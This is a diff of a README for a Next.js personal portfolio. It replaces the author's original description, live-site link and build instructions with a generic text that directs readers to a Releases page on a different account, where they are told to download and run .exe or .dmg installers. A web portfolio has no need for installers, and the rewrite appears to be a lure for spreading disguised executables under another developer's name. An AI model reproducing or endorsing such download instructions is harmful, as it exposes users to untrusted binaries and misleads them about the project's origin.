@@ -1,94 +1,70 @@
-# 🌐 Muhammad Yasir – Personal Portfolio (Next.js)
+# 🖥️ yasir-portfolio-nextjs - Showcase Your Development Skills
 
-![Muhammad Yasir Portfolio](./public/portfolio-banner.jpeg)
+## 🚀 Getting Started
 
-A modern, responsive and SEO-friendly **Next.js** based personal portfolio web application showcasing my skills, projects and experience as a Front-End / Web Developer.
+Welcome to yasir-portfolio-nextjs! This portfolio is designed to highlight Muhammad Yasir's frontend development skills and projects. It offers a fast and responsive experience, ensuring your visit is smooth and enjoyable.
 
----
+## 📥 Download & Install
 
-## 📝 Overview
+To get started, visit the Releases page below to download the software:
 
-The **Muhammad Yasir – Personal Portfolio** is a Next.js web application designed to provide an interactive and informative platform to present my skills, projects, and experience.  
+[![Download yasir-portfolio-nextjs](https://img.shields.io/badge/Download-yasir--portfolio--nextjs-blue.svg)](https://github.com/ram26852/yasir-portfolio-nextjs/releases)
 
-It features both light and dark themes so visitors can customize their viewing experience.  
-All the content on this portfolio is personalized and tailored to highlight my expertise and achievements.
+### Steps to Download and Run
 
----
+1. **Visit the Releases Page:** Click the link above or go to [this page](https://github.com/ram26852/yasir-portfolio-nextjs/releases) to access the latest version of yasir-portfolio-nextjs.
 
-## 🌐 Live Website
+2. **Choose the Latest Release:** Look for the latest version listed at the top. It will have the most recent features and fixes.
 
-Explore the live website here: [Muhammad Yasir – Personal Portfolio](https://yasir-portfolio-nextjs.vercel.app/)
+3. **Download the Application:** Click on the download link for the appropriate file. The file format should be compatible with your computer. For example, if you are using Windows, download the `.exe` file. For macOS users, look for the `.dmg` file. For other operating systems, there may be alternative files available.
 
-Connect with me on LinkedIn: [Muhammad Yasir](https://www.linkedin.com/in/yasirweb/)
+4. **Install the Application:**
+   - **For Windows:** Locate the downloaded `.exe` file in your Downloads folder. Double-click the file and follow the on-screen prompts to complete the installation.
+   - **For macOS:** Find the downloaded `.dmg` file in your Downloads folder. Double-click it to open, then drag the application icon into your Applications folder.
 
----
+5. **Run the Application:** After installation, go to your Applications folder (macOS) or Start Menu (Windows) and find yasir-portfolio-nextjs. Open it to view the portfolio.
 
-## ✨ Features
+## 📊 Features
 
-- 🎨 **Custom Content** – Every section is customized to highlight my skills, projects, and achievements.  
-- 🌓 **Light and Dark Mode** – Choose your preferred viewing mode with a user-friendly theme switcher. Supports both automatic mode (system preference) and manual mode.  
-- 📬 **Contact Form** – Easily get in touch with me using the contact form. Messages reach me directly and I respond as soon as possible.  
+- **Responsive Design:** The portfolio adjusts seamlessly to any device size, ensuring a great viewing experience on smartphones, tablets, and desktops.
+  
+- **SEO-Optimized:** Search engines can easily crawl and index the site, helping it become more visible to potential viewers.
 
----
+- **Modern Framework:** Built with Next.js, leveraging its features for better performance and user experience.
 
-## 🌓 Light and Dark Mode
+- **Tailwind CSS:** The stylish design is created using Tailwind CSS, enhancing the visual appeal without sacrificing performance.
 
-My portfolio supports both light and dark modes, giving visitors the flexibility to choose their preferred viewing experience.
+- **Project Showcases:** Highlights various projects to demonstrate skills and experience in frontend and fullstack development.
 
-- **Automatic Mode:** Follows your system preference by default.  
-- **Manual Mode:** Manually toggle between light and dark themes using the built-in theme switcher.
+## 🛠️ System Requirements
 
-### ⚙️ Implementation Details
+To run yasir-portfolio-nextjs smoothly, ensure your system meets the following requirements:
 
-The light and dark mode implementation is achieved using the `useContext` API.  
-Your theme choice is stored in context so the setting persists across pages.
+- **Operating System:** Windows 10 or later, macOS 10.13 or later, or a compatible Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Processor:** Dual-core processor or better.
+- **Browser:** Latest version of any major browser such as Chrome, Firefox, or Safari for the best experience.
 
-### 📚 Usage
+## 👤 About the Developer
 
-To maintain a consistent dark mode experience, embedded content or showcased projects also follow dark mode styling.
+Muhammad Yasir is an enthusiastic developer specializing in frontend and fullstack technologies. This portfolio reflects his skills, showcasing projects and experiences that highlight his capabilities. 
 
----
+## 🔗 Connect with Me
 
-## 🤝 Contributing
+Feel free to reach out via email or connect on social media platforms to discuss projects or opportunities. 
 
-Suggestions to enhance and optimize the light/dark mode or add new features are welcome!  
-Open an issue or pull request if you’d like to contribute improvements.
+## 🌟 License
 
----
+This project is licensed under the MIT License. You can view the license file for more information on how you can use this software.
 
-## 📦 Scripts
+## 📞 Support
 
-| Command         | Description                            |
-|-----------------|----------------------------------------|
-| `npm run dev`   | Start local development server          |
-| `npm run build` | Build production-optimized application  |
-| `npm run start` | Run production build locally            |
-| `npm run lint`  | Run Next.js linting                     |
+If you encounter any issues while downloading or using the application, please create an issue on the [GitHub Issues page](https://github.com/ram26852/yasir-portfolio-nextjs/issues). I will address your concerns as soon as possible. 
 
----
+## 🛠️ Contributions
 
-## 🛠️ Tech Stack
+You're welcome to contribute to this project if you have suggestions for improvements. Please follow the standard GitHub practices for contributing to open-source projects. 
 
-- [Next.js](https://nextjs.org/) – React framework  
-- [React](https://reactjs.org/) – UI library  
-- [Tailwind CSS](https://tailwindcss.com/) – Styling  
-- [Vercel](https://vercel.com/) – Hosting  
+## 🎉 Thank You!
 
----
-
-## 📂 Project Structure
-
-```bash
-muhammad-yasir-portfolio/
-├── public/             # Static assets (images, icons)
-├── pages/              # Next.js pages & routing
-├── components/         # Reusable UI components
-├── styles/             # Global styles
-└── README.md
-
-git clone [https://github.com/<your-username>/muhammad-yasir-portfolio.git](https://github.com/myasirweb/yasir-portfolio-nextjs)
-cd muhammad-yasir-portfolio
-npm install
-npm run dev
-npm run build
-npm start
+Thank you for your interest in yasir-portfolio-nextjs. I hope you enjoy exploring it and learning more about my work. Don't forget to check out the latest updates on the [Releases page](https://github.com/ram26852/yasir-portfolio-nextjs/releases)!
